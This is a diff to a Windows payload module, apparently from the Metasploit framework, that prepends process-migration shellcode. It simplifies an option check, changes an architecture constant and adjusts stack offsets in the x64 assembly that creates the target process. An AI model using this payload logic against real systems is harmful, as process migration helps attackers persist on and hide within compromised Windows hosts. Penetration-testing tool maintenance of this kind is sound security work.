@@ -1,5 +1,4 @@
 # -*- coding: binary -*-
-require 'msf/core'
 
 ###
 #
@@ -28,7 +27,7 @@ module Msf::Payload::Windows::PrependMigrate
   # for discussion.
   #
   def prepend_migrate?
-    !!(datastore['PrependMigrate'] && datastore['PrependMigrate'].to_s.downcase == 'true')
+    datastore['PrependMigrate']
   end
 
   #
@@ -45,7 +44,7 @@ module Msf::Payload::Windows::PrependMigrate
         migrate_asm = prepend_migrate(buf)
         pre << Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string
       # Handle all x64 code here
-      elsif test_arch.include?(ARCH_X86_64) or test_arch.include?(ARCH_X64)
+      elsif test_arch.include?(ARCH_X64)
         migrate_asm = prepend_migrate_64(buf)
         pre << Metasm::Shellcode.assemble(Metasm::X64.new, migrate_asm).encode_string
       end
@@ -461,9 +460,9 @@ module Msf::Payload::Windows::PrependMigrate
 
       ; create the process
       push 0                    ; keep the stack aligned
-      lea rdi,[rsp+0x110]       ; Offset of empty space for lpProcessInformation
+      lea rdi,[rsp+0x120]       ; Offset of empty space for lpProcessInformation
       push rdi                  ; lpProcessInformation : write processinfo here
-      lea rcx,[rsp+0x58]
+      lea rcx,[rsp+0x60]
       push rcx                  ; lpStartupInfo : current info (read)
       xor rcx,rcx
       push rcx                  ; lpCurrentDirectory
